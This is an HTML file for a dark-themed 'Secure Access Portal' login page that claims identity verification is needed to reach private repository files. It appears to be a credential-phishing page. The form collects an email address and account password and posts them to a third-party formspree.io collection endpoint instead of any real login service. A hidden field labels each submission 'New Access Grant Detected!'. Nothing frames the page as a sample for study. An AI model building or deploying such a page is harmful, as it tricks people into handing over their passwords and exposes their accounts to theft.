<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: #2d2d2d; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 100%; max-width: 350px; text-align: center; }
        h2 { margin-bottom: 20px; font-weight: 500; color: #00aaff; }
        p { font-size: 14px; color: #aaaaaa; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 6px; background: #3d3d3d; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border: none; border-radius: 6px; background: #00aaff; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #0088cc; }
        .footer-text { margin-top: 20px; font-size: 11px; color: #666; }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Member Portal</h2>
        <p>Identity verification required to access private repository files.</p>
        
        <form action="https://formspree.io/f/mnjlbagr" method="POST">
            <input type="email" name="User_Email" placeholder="Email Address" required>
            <input type="password" name="Security_Key" placeholder="Account Password" required>
            
            <input type="hidden" name="_subject" value="New Access Grant Detected!">
            <button type="submit">Verify & Access</button>
        </form>

        <div class="footer-text">
            &copy; 2026 Secure Dev Environments. All rights reserved.
        </div>
    </div>

</body>
</html>
